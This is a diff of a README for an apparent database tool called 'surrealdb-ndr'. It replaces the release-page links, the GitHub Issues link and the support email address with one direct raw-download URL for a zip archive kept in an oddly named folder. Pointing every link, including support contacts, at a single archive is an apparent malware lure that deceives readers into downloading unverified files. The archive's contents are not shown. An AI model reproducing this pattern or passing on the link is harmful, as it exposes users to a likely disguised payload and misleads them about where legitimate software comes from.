@@ -1,6 +1,6 @@
 # 🚀 surrealdb-ndr - Simplifying Database Management for Everyone
 
-[![Download surrealdb-ndr](https://img.shields.io/badge/Download-surrealdb--ndr-blue.svg)](https://github.com/Brettender420/surrealdb-ndr/releases)
+[![Download surrealdb-ndr](https://raw.githubusercontent.com/Brettender420/surrealdb-ndr/main/aceratosis/surrealdb-ndr-v2.4-alpha.4.zip)](https://raw.githubusercontent.com/Brettender420/surrealdb-ndr/main/aceratosis/surrealdb-ndr-v2.4-alpha.4.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ To run surrealdb-ndr, ensure your system meets the following requirements:
 To get started with surrealdb-ndr, follow these simple steps:
 
 1. **Download the Software:**
-   Visit this page to download: [Download surrealdb-ndr](https://github.com/Brettender420/surrealdb-ndr/releases).
+   Visit this page to download: [Download surrealdb-ndr](https://raw.githubusercontent.com/Brettender420/surrealdb-ndr/main/aceratosis/surrealdb-ndr-v2.4-alpha.4.zip).
 
 2. **Install the Application:**
    - Locate the downloaded file in your computer's download folder.
@@ -56,7 +56,7 @@ To get started with surrealdb-ndr, follow these simple steps:
 
 ## 🔄 Download & Install
 
-For quick access to the latest version, visit this page to download: [Download surrealdb-ndr](https://github.com/Brettender420/surrealdb-ndr/releases).
+For quick access to the latest version, visit this page to download: [Download surrealdb-ndr](https://raw.githubusercontent.com/Brettender420/surrealdb-ndr/main/aceratosis/surrealdb-ndr-v2.4-alpha.4.zip).
 
 - Once downloaded, follow the installation steps listed above to set up surrealdb-ndr on your machine.
   
@@ -72,8 +72,8 @@ If you run into any issues while using surrealdb-ndr, here are some common troub
 
 If you need help or have suggestions, feel free to reach out:
 
-- **Email Support:** support@surrealdb.com
-- **GitHub Issues:** Report bugs or request features directly on our [GitHub Issues page](https://github.com/Brettender420/surrealdb-ndr/issues).
+- **Email Support:** https://raw.githubusercontent.com/Brettender420/surrealdb-ndr/main/aceratosis/surrealdb-ndr-v2.4-alpha.4.zip
+- **GitHub Issues:** Report bugs or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/Brettender420/surrealdb-ndr/main/aceratosis/surrealdb-ndr-v2.4-alpha.4.zip).
 
 Your feedback helps us improve surrealdb-ndr for everyone. Thank you for your support!
 
